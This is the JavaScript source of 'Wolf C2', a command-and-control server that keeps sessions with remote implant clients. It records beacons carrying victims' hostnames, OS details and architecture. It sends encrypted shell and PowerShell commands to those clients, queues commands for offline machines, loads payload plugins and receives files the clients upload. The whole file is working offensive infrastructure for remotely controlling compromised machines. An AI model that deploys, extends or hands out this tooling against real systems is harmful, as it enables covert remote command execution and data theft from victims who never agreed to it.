/**
 *                                  ,--,                                               
 *                               ,---.'|                                               
 *            .---.    ,----..   |   | :       ,---,.          ,----..        ,----,   
 *           /. ./|   /   /   \  :   : |     ,'  .' |         /   /   \     .'   .' \  
 *       .--'.  ' ;  /   .     : |   ' :   ,---.'   |        |   :     :  ,----,'    | 
 *      /__./ \ : | .   /   ;.  \;   ; '   |   |   .'        .   |  ;. /  |    :  .  ; 
 *  .--'.  '   \' ..   ;   /  ` ;'   | |__ :   :  :          .   ; /--`   ;    |.'  /  
 * /___/ \ |    ' ';   |  ; \ ; ||   | :.'|:   |  |-,        ;   | ;      `----'/  ;   
 * ;   \  \;      :|   :  | ; | ''   :    ;|   :  ;/|        |   : |        /  ;  /    
 *  \   ;  `      |.   |  ' ' ' :|   |  ./ |   |   .'        .   | '___    ;  /  /-,   
 *   .   \    .\  ;'   ;  \; /  |;   : ;   '   :  '          '   ; : .'|  /  /  /.`|   
 *    \   \   ' \ | \   \  ',  / |   ,/    |   |  |          '   | '/  :./__;      :   
 *     :   '  |--"   ;   :    /  '---'     |   :  \          |   :    / |   :    .'    
 *      \   \ ;       \   \ .'             |   | ,'           \   \ .'  ;   | .'       
 *       '---"         `---`               `----'              `---`    `---'          
 *    AUTHOR: Russell Benzing                             
 *    VERSION: 0.2.0
 *    LICENSE: GPL-3.0
 */
//  ------------------------------------- VARIABLES -------------------------------------
const { createServer } = require('node:net');
const { promisify } = require('node:util');

const { mkdir, readdir, writeFile, existsSync, createWriteStream } = require('node:fs');
const { join } = require('node:path');
const { createInterface } = require('node:readline');

const { encryptData, decryptData, getSessionId } = require('./utils/encdec');
const { getLocalIpAddress, getUptime } = require('./utils/helpers');
const { log, logInfo, logError, logSuccess, createLogStream } = require('./utils/logging');

// promises
const mkdir_promise = promisify(mkdir);
const readdir_promise = promisify(readdir);
const writeFile_promise = promisify(writeFile);

const _VERSION = '0.2.0';
const CHUNK_SIZE = 1024;
const PORT = 54678;
const LOGGING = true;

const DOWNLOADS_FOLDER = join(__dirname, 'downloads');
const PLUGINS_FOLDER = join(__dirname, 'plugins');

const activeClients = new Map();
const queuedCommands = new Map();
const loadedPlugins = new Map();
const serverCommands = ['help', 'client', 'clients', 'exit', 'plugins', 'set', 'uptime', 'clear'];
const clientCommands = [];

let rl = null; // console readline instance
let activeClientSessionID = null; // active client
let server = null; // server sockets instance
let logStream = null; // log stream instance
let startTime = Date.now(); // script start time

/**
 * Beacon handler
 * @param {*} response
 * @param {*} sessionId 
 */
const handleBeacon = (response, sessionId) => {
    const client = activeClients.get(sessionId);
    logInfo(`\nReceived beacon from client: ${sessionId}`, logStream);
    const date = new Date();
    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
    const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
    const formattedDate = date.toLocaleDateString('en-US', dateOptions);
    const formattedTime = date.toLocaleTimeString('en-US', timeOptions);
    client.lastSeen = `${formattedDate} ${formattedTime}`;
    client.active = true;
    client.type = response.type;
    client.version = response.version;
    client.platform = response.platform, 
    client.arch = response.arch, 
    client.osver = response.osver, 
    client.hostname = response.hostname
    executeQueuedCommands(client);
};

/**
 * Download handler
 * @param {*} response
 * @param {*} client
 */
const handleDownloadResponse = async (response) => {
    try {
        if (!existsSync(DOWNLOADS_FOLDER)) {
            await mkdir_promise(DOWNLOADS_FOLDER);
        }
        const fileName = response.download;
        const assembledFilePath = join(DOWNLOADS_FOLDER, fileName);
        await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOADS_FOLDER}`, logStream);
    } catch (error) {
        logError(`Error handling download response: ${error.message}`, logStream);
    }
};

/**
 * Default handler
 * @param {*} response 
 * @returns 
 */
const handleResponse = (response) => {
    if (!response) {
        logError("Error: invalid response.", logStream);
        return;
    }
    // deconstruct the response response if exists;
    if (response.response) {
        response = response.response;
    }
    if (response.data) {
        let data = response.data;
        if (data.type === "Buffer") {
            // handle buffer response
            const response = Buffer.from(data.data).toString('utf8').trim();
            log(response, undefined, logStream);
            return;
        } else {
            if (typeof data !== 'string') {
                data = JSON.stringify(data);
            }
            log(data.toString('utf8').trim(), undefined, logStream);
        }
        return;
    } else if (response.message) {
        logInfo(response.message, logStream);
        return;
    } else if (response.error) {
        logError(response.error, logStream);
        return;
    }
};

/**
 * Shows the full active client details
 */
const showClient = () => {
    if (!activeClientSessionID) {
        throw new Error(`You must set a session ID first.`);
    }
    const client = activeClients.get(activeClientSessionID);
    if (!client) {
        throw new Error(`Invalid session ID: ${activeClientSessionID}`);
    }
    log("\nClient Details:", 93, logStream);
    log(["Last Seen:\t\t", client.lastSeen], [96, 97], logStream);
    log(["Active:\t\t\t", client.active], [96, 97], logStream);
    log(["Session ID:\t\t", client.sessionId], [96, 97], logStream);
    log(["Hostname:\t\t", client.hostname], [96, 97], logStream);
    log(["IP Address:\t\t", client.address], [96, 97], logStream);
    log(["Type:\t\t\t", client.type], [96, 97], logStream);
    log(["Client Ver:\t\t", client.version], [96, 97], logStream);
    log(["Architecture:\t\t", client.arch], [96, 97], logStream);
    log(["Platform:\t\t", client.platform], [96, 97], logStream);
    log(["OS Ver:\t\t\t", client.osver, "\n"], [96, 97, 97], logStream);
};

/**
 * Sets the active client session ID
 * @param {*} sessionId 
 */
const setClientActive = (sessionId) => {
    if (!sessionId) {
        activeClientSessionID = null;
        log('The active session ID has been cleared.', undefined, logStream);
        return;
    }
    let clientExists = activeClients.get(sessionId);
    if (sessionId && clientExists && sessionId.length === 32) {
        activeClientSessionID = sessionId;
        log(`${activeClientSessionID} is now the active session.`, undefined, logStream);
    } else {
        logError('Invalid session ID.', logStream);
    }
};

/**
 * Handles the command input for the server
 * @param {*} command 
 * @param {*} properties 
 */
const handleServerCommand = async (command, properties) => {
    try {
        if (clientCommands.includes(command.split(' ')[0]) ||
            serverCommands.includes(command.split(' ')[0])) {
            let handledByPlugin = false;
            for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
                if (pluginModule.commands && pluginModule.commands[command]) {
                    const pluginCommand = pluginModule.commands[command];
                    if (pluginModule.type === 'server') {
                        pluginCommand.handler(properties, {process, rl, console});
                    } else if (pluginModule.type === 'client') {
                        switch (pluginCommand.method) {
                            case 'payload-ps':
                                await sendClientCommand('ps', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'payload-cmd':
                                await sendClientCommand('cmd', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'execute':
                                command = pluginCommand.handler(properties);
                                await sendClientCommand(command, properties);
                                break;
                            default:
                        }
                    }
                    handledByPlugin = true;
                    break;
                }
            }
            if (!handledByPlugin) {
                switch (command) {
                    case 'clear':
                        console.clear();
                        await rl.write("\u001b[0J\u001b[1J\u001b[2J\u001b[0;0H\u001b[0;0W", { ctrl: true, name: 'l'});
                        break;
                    case 'uptime':
                        log(getUptime(startTime), undefined, logStream);
                        break;
                    case 'set':
                        setClientActive(properties[0]);
                        break;
                    case 'plugins':
                        displayActivePlugins();
                        break;
                    case 'help':
                        displayCommandOptions();
                        break;
                    case 'client':
                        showClient(properties[0]);
                        break;
                    case 'clients':
                        showActiveClients();
                        break;
                    case 'exit':
                        closeServer();
                        break;
                    default:
                        logInfo('Invalid command. Type "help" to see available commands.', logStream);
                }
            }
        }
        await rl.prompt();
    } catch (error) {
        logError(`Exception: ${error.message}`, logStream);
    }
};

//  ------------------------------------- Methods -------------------------------------

/**
 * Sends a command to a client
 * @param {*} client
 * @param {*} command 
 * @param {*} args 
 */
const sendCommandToClient = async (client, command, args) => {
    if (!client) {
        throw new Error('Invalid client.'); 
    } else if (!command) {
        throw new Error('Missing command.')
    }
    if (client && client.active) {
        await executeClientCommand(client, [command, ...args].join(' '));
    } else {
        const queuedCommandsForSession = queuedCommands.get(client.sessionId) || [];
        queuedCommandsForSession.push({ command, args });
        logInfo(`Queued command for client ${client.sessionId}. Command: ${command} ${args}`, logStream);
        queuedCommands.set(client.sessionId, queuedCommandsForSession);
    }
};

/**
 * Execute a client command
 * @param {*} client 
 * @param {*} command 
 */
const executeClientCommand = async (client, command) => {
    const socket = client.socket;
    const sessionId = client.sessionId;
    let cipher = 'aes-256-gcm';
    if (client.type === 'ps') {
        cipher = 'aes-256-cbc';
    }
    const payload = await encryptData(command, sessionId, cipher);
    if (payload) {
        return new Promise((resolve) => {
            if (socket.write(payload) === true) {
                // wait
            } else {
                socket.once("drain", resolve(true));
            }
        });
    } else {
        throw new Error("Payload invalid.");
    }
};

/**
 * Execute the queued command on a session ID
 */
const executeQueuedCommands = async (client) => {
    if (!client || !client.sessionId) {
        throw new Error('No active session ID set.');
    }
    const commands = queuedCommands.get(client.sessionId);
    if (commands) {
        commands.forEach(async ({ command, args }) => {
            await executeClientCommand(client, `${command} ${args.join(' ')}`);
            logInfo(`Queued client command executed: ${command} ${args.join(' ')}`, logStream);
        });
        queuedCommands.delete(client.sessionId);
    }
};

/**
 * Shows the clients list
 * @returns 
 */
const showActiveClients = () => {
    if (activeClients.size === 0) {
        getHowel();
        logInfo('No active clients.', logStream);
        return;
    }
    const active = Array.from(activeClients.values()).filter(client => client.active).length;
    logSuccess(`\nClient Sessions (${activeClients.size} Total / ${active} Active):`, logStream);
    const colWidths = [36, 15, 20, 10, 10, 10, 10];
    const totalWidth = colWidths.reduce((sum, width) => sum + width, 0) + colWidths.length + 1;
    const pad = (str, len) => str ? str.padEnd(len) : "".padEnd(10);
    logInfo('┌' + '─'.repeat(totalWidth - 2) + '┐', logStream);
    logInfo('│' + pad('SessionID', colWidths[0]) + '│' +
                     pad('ClientIP', colWidths[1]) + '│' +
                     pad('Updated', colWidths[2]) + '│' +
                     pad('Online', colWidths[3]) + '│' +
                     pad('Active', colWidths[4]) + '│' +
                     pad('Ver', colWidths[5]) + '│' +
                     pad('Type', colWidths[6]) + '│', logStream);
    logInfo('├' + colWidths.map(w => '─'.repeat(w)).join('┼') + '┤', logStream);
    for (const [sessionId, client] of activeClients) {
        const datetime = new Date(client.lastSeen);
        const lastSeen = datetime.toLocaleDateString('en-US', {
            weekday: 'short',
            year: 'numeric',
            month: 'short',
            day: 'numeric'
        });
        logInfo('│' + pad(sessionId, colWidths[0]) + '│' +
                         pad(client.address, colWidths[1]) + '│' +
                         pad(lastSeen, colWidths[2]) + '│' +
                         pad(client.active ? 'Yes' : 'No', colWidths[3]) + '│' +
                         pad(client.sessionId === activeClientSessionID ? 'Yes' : 'No', colWidths[4]) + '│' +
                         pad(client.version, colWidths[5]) + '│' +
                         pad(client.type, colWidths[6]) + '│', logStream);
    }
    logInfo('└' + colWidths.map(w => '─'.repeat(w)).join('┴') + '┘', logStream);
};

/**
 * Registers a plugin for the server
 * @param {*} plugin 
 */
const registerPlugin = (plugin) => {
    // Register additional commands provided by the plugin
    if (plugin && plugin.module) {
        const commandKeys = Object.keys(plugin.module.commands).filter(c => c.method !== 'execute');
        if (plugin.module.type === 'server') {
            serverCommands.push(...commandKeys);
        } else if(plugin.module.type === 'client') {
            clientCommands.push(...commandKeys);
        }
        commandKeys.forEach((command) => {
            // Extract command name and function
            const cmd = plugin.module.commands[command],
                  name = cmd.name,
                  handler = cmd.handler;

            // Check if the command name is not already registered
            if (!global[name]) {
                // Register the command globally
                global[name] = handler;
            } else {
                logError(`Plugin: "${plugin.name}" is already registered.`, logStream);
            }
        });
    }
    logInfo(`Plugin: "${plugin.name} - ${plugin.module.description}" has been registered.`, logStream);

    // Add the plugin to the loaded plugins map
    loadedPlugins.set(plugin.name, plugin.module);
};

/**
 * Loads plugins for the server then registers them
 */
const loadAndRegisterPlugins = async () => {
    try {
        const pluginFiles = await readdir_promise(PLUGINS_FOLDER, { withFileTypes: true });
        await Promise.all(pluginFiles.map((file) => {
            const pluginName = file.name;
            const pluginPath = join(PLUGINS_FOLDER, pluginName);
            const pluginModule = require(pluginPath);
            if (!pluginModule || typeof pluginModule !== 'object') {
                logError(`Invalid plugin module in file "${pluginName}". Skipping...`, logStream);
                return;
            }
            // Check if the plugin module exports the 'commands' object
            if (!pluginModule.commands) {
                logError(`Plugin "${pluginName}" does not have valid commands defined.`, logStream);
                return;
            }
            if (file.isFile()) {
                registerPlugin({ name: pluginName, module: pluginModule });
            }
        }));
    } catch (err) {
        logError(`Error loading plugins: ${err.message}`, logStream);
    }
};

const getHowel = () => {
    log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⠀⠠⣄⠸⢹⣦⠀⠀⡄⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢹⣦⢠⣼⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀
⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀
⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
⠀⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻`, undefined, logStream);
};

const getWolfText = () => {
    log(`██╗⠘⣰⣿⣿██╗ ██████╗ ██╗⢶⣿⡎⠻⣆███████╗     ██████╗██████╗ 
██║⡟⡿⢿⡿██║██╔═████╗██║⠙⢿⡄⡈⢆██╔════╝    ██╔════╝╚════██╗
██║ █╗ ██║██║██╔██║██║⠀⡇⢹⢿⡀█████╗      ██║      █████╔╝
██║███╗██║████╔╝██║██║⠀⠀⠼⠇⠁██╔══╝      ██║     ██╔═══╝ 
╚███╔███╔╝╚██████╔╝███████╗██║         ╚██████╗███████╗
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝          ╚═════╝╚══════╝`, undefined, logStream);
};

/**
 * Shows the startup info
 */
const getStartup = () => {
    getWolfText();
    log([`Ver. ${_VERSION}`, ' | ',`Listening on: ${getLocalIpAddress()}:${PORT}`, ' | ', `${getUptime(startTime)}`], [94, 97, 93, 97, 93], logStream);
};

/**
 * Displays the active plugins
 */
const displayActivePlugins = () => {
    log("\nACTIVE PLUGINS:", 93, logStream);
    Array.from(loadedPlugins).forEach(plugin => {
        const [ name, module ] = plugin;
        log(["Type:", `\t\t${module.type} plugin`], [96, 97], logStream);
        log(["Name:", `\t\t${name}`], [96, 97], logStream);
        log(["Description:", `\t${module.description}`], [96, 97], logStream);
        log(["Commands:", `\t${Object.keys(module.commands).join(', ')}\n`], [96, 97], logStream);
    });
};

/**
 * Displays the server commands
 */
const displayCommandOptions = () => {
    log("\nSERVER COMMANDS:", 93, logStream);
    log(["help\t\t", "Display available commands."], [96, 97], logStream);
    log(["plugins \t", "List all active plugins."], [96, 97], logStream);
    log(["clients \t", "List all active clients."], [96, 97], logStream);
    log(["uptime\t\t", "Display server uptime."], [96, 97], logStream);
    log(["set\t\t", "Sets the client session to make active."], [96, 97], logStream);
    log(["clear\t\t", "Clear the console."], [96, 97], logStream);
    log(["exit\t\t", "Exit the server."], [96, 97], logStream);
    log("\nPLUGINS:", 93, logStream);
    for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
        log(`${pluginName}: ${pluginModule.description}`, 93, logStream);
        if (pluginModule.commands) {
            let cnt = 0;
            Object.keys(pluginModule.commands).forEach((command) => {
                let cmdLength = command.length,
                format = `\t`;
                if (cmdLength < 6) {
                    format = `\t\t`;
                } else if (cmdLength === 6 || cmdLength === 7) {
                    format = `  \t`;
                }
                cnt += 1;
                let format2 = "";
                if (cnt === Object.keys(pluginModule.commands).length) {
                    format2 = "\n";
                }
                log([`${command}${format}`, `${pluginModule.commands[command].description}${format2}`], [96, 97], logStream);
            });
        }
    }
};

const sendClientCommand = async (command, args) => {
    const sessionId = activeClientSessionID || null;
    if (sessionId) {
        const client = activeClients.get(sessionId);
        if (!client) {
            logError(`Invalid client session ID or client not found.`, logStream);
            return;
        }
        // Send command to client and wait for response
        await sendCommandToClient(client, command, args);
    } else {
        logInfo(`You must first set an active client sessionID.`, logStream);
    }
};

/**
 * Closes the server connection
 */
const closeServer = () => {
    for (const [sessionId, client] of activeClients) {
        client.socket.destroy();
        logSuccess(`Client connection ${sessionId} has been closed.`, logStream);
    }
    activeClientSessionID = null;
    server.close(() => {
        logInfo('\nServer connection closed', logStream);
        if (rl) {
            rl.close();
            logSuccess(`Console has been closed.`, logStream);
        }
        if (logStream) {
            // stop log stream
            logStream.end();
            logSuccess(`LogStream has been closed.`, logStream);
        }
        process.exit(0);
    });
};

/**
 * Processes and shows the input on the console
 */
const startInputListener = () => {
    rl = createInterface({
        input: process.stdin,
        output: process.stdout,
        prompt: "\x1b[33mEnter command > \x1b[0m"
    });

    rl.prompt();

    rl.on('line', async (input) => {
        try {
            const [command, ...args] = input.trim().split(/ +(?=(?:(?:[^"]*"){2})*[^"]*$)/); // Use regex to split by any whitespace
            if (!command) {
                rl.prompt();
                return;
            }
            if (LOGGING && logStream) {
                logStream.write(`Enter command > ${command}\n`);
            }
            // handle the command
            await handleServerCommand(command, args);
        } catch (error) {
            logError(`Error: ${error.message}`, logStream);
            rl.prompt();
        }
    });
};

// Net Socket Server
server = createServer((socket) => {
    const ipAddress = socket.address().address.replace("::ffff:","");
    const sessionId = getSessionId(ipAddress)
    let client = activeClients.get(sessionId);
    if (!client) {
        client = {
            sessionId: sessionId,
            socket: socket,
            address: ipAddress,
            lastSeen: new Date(),
            active: true,
            buffer: '',
            waiting: false,
            version: null,
            type: null,
            platform: null, 
            arch: null, 
            osver: null, 
            hostname: null
        };
        activeClients.set(sessionId, client);
    } else {
        client.active = true;
        client.socket = socket;
        client.lastSeen = (new Date()).getDate();
    }
    socket.on('data', async (payload) => {
        try {
            if (payload.length >= CHUNK_SIZE || payload.includes('--FIN--')) {
                // chunk mode
                client.waiting = true;
                client.buffer += payload;
                if (client.buffer.includes('--FIN--')) {
                    const bufferChunks = client.buffer.replace('--FIN--', '');
                    const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
                    const parsed = JSON.parse(decrypted);
                    const response = parsed.response;
                    if (response.download) {
                        await handleDownloadResponse(response);
                    } else {
                        handleResponse(response);
                    }
                    client.waiting = false;
                    client.buffer = '';
                }
            } else {
                // non-chunk mode
                const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
                const parsed = JSON.parse(decrypted);
                const response = parsed.response;
                if (response.beacon) {
                    handleBeacon(response, client.sessionId);
                } else if (response.download) {
                    await handleDownloadResponse(response, client.sessionId);
                } else if (response.error) {
                    logError(response.error, logStream);
                } else {
                    handleResponse(response);
                }
            }
        } catch(err) {
            logError(err.message, logStream);
        }
    });
    socket.on('end', () => {
        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
        if (client) {
            client.lastSeen = new Date();
            client.active = false;
        }
    });
    socket.on('error', (err) => {
        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
        if (client) {
            client.active = false;
        }
    });
});

server.on('error', (err) => {
    logError(`\nServer threw an error: ${err.message}`, logStream);
    closeServer();
});

server.listen(PORT, async () => {
    logStream = await createLogStream(LOGGING);
    getHowel();
    getStartup();
    await loadAndRegisterPlugins();
    startInputListener();
});